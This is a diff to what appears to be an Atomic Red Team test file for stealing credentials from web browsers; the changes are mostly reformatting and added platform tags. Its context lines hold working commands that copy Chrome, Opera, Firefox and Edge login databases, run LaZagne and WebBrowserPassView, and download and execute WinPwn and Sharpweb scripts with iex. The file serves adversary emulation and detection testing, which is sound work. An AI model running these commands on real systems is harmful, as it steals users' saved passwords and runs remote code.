@@ -1,5 +1,5 @@
 attack_technique: T1555.003
-display_name: "Credentials from Password Stores: Credentials from Web Browsers"
+display_name: 'Credentials from Password Stores: Credentials from Web Browsers'
 atomic_tests:
 - name: Run Chrome-password Collector
   auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
@@ -35,6 +35,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item "#{file_path}\Sysinternals" -Force -Recurse -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: Search macOS Safari Cookies
   auto_generated_guid: c1402f7b-67ca-43a8-b5f3-3143abedc01b
   description: |
@@ -53,6 +55,8 @@ atomic_tests:
       cd ~/Library/Cookies
       grep -q "#{search_string}" "Cookies.binarycookies"
     name: sh
+  run_on:
+  - macos
 - name: LaZagne - Credentials from Browser
   auto_generated_guid: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
   description: |
@@ -79,6 +83,8 @@ atomic_tests:
     elevation_required: true
     command: |
       "#{lazagne_path}" browsers
+  run_on:
+  - windows
 - name: Simulating access to Chrome Login Data
   auto_generated_guid: 3d111226-d09a-4911-8715-fe11664f960d
   description: |
@@ -89,7 +95,9 @@ atomic_tests:
   dependencies:
   - description: |
       Chrome must be installed
-    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+      -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+      {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
@@ -105,6 +113,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
+  run_on:
+  - windows
 - name: Simulating access to Opera Login Data
   auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
   description: |
@@ -115,7 +125,9 @@ atomic_tests:
   dependencies:
   - description: |
       Opera must be installed
-    prereq_command: 'if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe") -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}'
+    prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
+      -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
+      Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
@@ -125,7 +137,8 @@ atomic_tests:
       Stop-Process -Name "opera"
   - description: |
       Opera login data file must exist
-    prereq_command: 'if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login Data") {exit 0} else {exit 1}'
+    prereq_command: if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login
+      Data") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login Data" -ItemType File
   executor:
@@ -134,6 +147,8 @@ atomic_tests:
       Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
     cleanup_command: |
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
+  run_on:
+  - windows
 - name: Simulating access to Windows Firefox Login Data
   auto_generated_guid: eb8da98a-2e16-4551-b3dd-83de49baa14c
   description: |
@@ -145,7 +160,9 @@ atomic_tests:
   dependencies:
   - description: |
       Firefox must be installed
-    prereq_command: 'if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}'
+    prereq_command: if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe")
+      -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit
+      0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US"}
@@ -154,7 +171,8 @@ atomic_tests:
       Start-Process $installer -ArgumentList '/S' -Wait
   - description: |
       Firefox login data file must exist
-    prereq_command: 'if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit 0} else {exit 1}'
+    prereq_command: if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit
+      0} else {exit 1}
     get_prereq_command: |
       if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
       Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
@@ -167,6 +185,8 @@ atomic_tests:
       Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
     cleanup_command: |
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
+  run_on:
+  - windows
 - name: Simulating access to Windows Edge Login Data
   auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
   description: |
@@ -178,12 +198,14 @@ atomic_tests:
   dependencies:
   - description: |
       Edge must be installed
-    prereq_command: 'if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe") {exit 0} else {exit 1}'
+    prereq_command: if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
+      {exit 0} else {exit 1}
     get_prereq_command: |
       "Installation is not implemented as Edge is a part of windows"
   - description: |
       Edge login data file must exist
-    prereq_command: 'if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default") {exit 0} else {exit 1}'
+    prereq_command: if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default")
+      {exit 0} else {exit 1}
     get_prereq_command: |
       $edge="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
       Start-Process $edge 
@@ -195,6 +217,8 @@ atomic_tests:
       Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -Recurse
     cleanup_command: |
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -ErrorAction Ignore -Recurse
+  run_on:
+  - windows
 - name: Decrypt Mozilla Passwords with Firepwd.py
   auto_generated_guid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
   description: |
@@ -291,9 +315,12 @@ atomic_tests:
       cat #{Out_Filepath}
     cleanup_command: |
       Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
+  run_on:
+  - windows
 - name: LaZagne.py - Dump Credentials from Firefox Browser
   auto_generated_guid: 87e88698-621b-4c45-8a89-4eaebdeaabb1
-  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne
+  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference
+    https://github.com/AlessandroZ/LaZagne
   supported_platforms:
   - linux
   input_arguments:
@@ -302,9 +329,10 @@ atomic_tests:
       type: string
       default: /tmp/LaZagne/Linux
     specific_module:
-      description: You may change the module to "all" for all password that can be found by LaZagne.py
+      description: You may change the module to "all" for all password that can be
+        found by LaZagne.py
       type: string
-      default: 'browsers -firefox'
+      default: browsers -firefox
     output_file:
       description: This is where output for the Firefox passwords goes
       type: string
@@ -313,15 +341,19 @@ atomic_tests:
   dependencies:
   - description: Get Lazagne from Github and install requirements
     prereq_command: 'test -f #{lazagne_path}/laZagne.py'
-    get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+    get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne;
+      cd /tmp/LaZagne/; pip install -r requirements.txt
   - description: Needs git, python3 and some pip stuff
     prereq_command: which git && which python3 && which pip
-    get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+    get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1
+      psutil Crypto
   executor:
     command: 'python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}'
     cleanup_command: 'rm -R /tmp/LaZagne; rm -f #{output_file}'
     name: sh
     elevation_required: true
+  run_on:
+  - linux
 - name: Stage Popular Credential Files for Exfiltration
   auto_generated_guid: f543635c-1705-42c3-b180-efd6dc6e7ee7
   description: |
@@ -345,9 +377,12 @@ atomic_tests:
     cleanup_command: |
       Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue   
       Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
+  run_on:
+  - windows
 - name: WinPwn - BrowserPwn
   auto_generated_guid: 764ea176-fb71-494c-90ea-72e9d85dce76
-  description: Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.
+  description: Collect Browser credentials as well as the history via winpwn browserpwn
+    function of WinPwn.
   supported_platforms:
   - windows
   executor:
@@ -358,9 +393,12 @@ atomic_tests:
     cleanup_command: |-
       rm .\System.Data.SQLite.dll -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - Loot local Credentials - mimi-kittenz
   auto_generated_guid: ec1d0b37-f659-4186-869f-31a554891611
-  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn
+    - Extend timeout to 600s
   supported_platforms:
   - windows
   executor:
@@ -369,9 +407,12 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       kittenz -consoleoutput -noninteractive
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials
   auto_generated_guid: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
-  description: PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn
+  description: PowerSharpPack - Sharpweb searching for Browser Credentials technique
+    via function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -379,6 +420,8 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
       Invoke-Sharpweb -command "all"
     name: powershell
+  run_on:
+  - windows
 - name: Simulating Access to Chrome Login Data - MacOS
   auto_generated_guid: 124e13e5-d8a1-4378-a6ee-a53cd0c7e369
   description: |
@@ -395,6 +438,8 @@ atomic_tests:
       rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
       rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
     name: sh
+  run_on:
+  - macos
 - name: WebBrowserPassView - Credentials from Browser
   auto_generated_guid: e359627f-2d90-4320-ba5e-b0f878155bbe
   description: |-
@@ -422,6 +467,8 @@ atomic_tests:
       Stop-Process -Name "WebBrowserPassView"
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
   auto_generated_guid: 6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd
   description: |
@@ -467,6 +514,8 @@ atomic_tests:
       Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
       Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\Login Data" > $null
     name: powershell
+  run_on:
+  - windows
 - name: Dump Chrome Login Data with esentutl
   auto_generated_guid: 70422253-8198-4019-b617-6be401b49fce
   description: |
@@ -483,7 +532,9 @@ atomic_tests:
   dependencies:
   - description: |
       Chrome must be installed
-    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+      -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+      {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
@@ -497,3 +548,5 @@ atomic_tests:
       esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "#{output_path}"
     cleanup_command: |
       del /f /q #{output_path} > nul 2>&1
+  run_on:
+  - windows
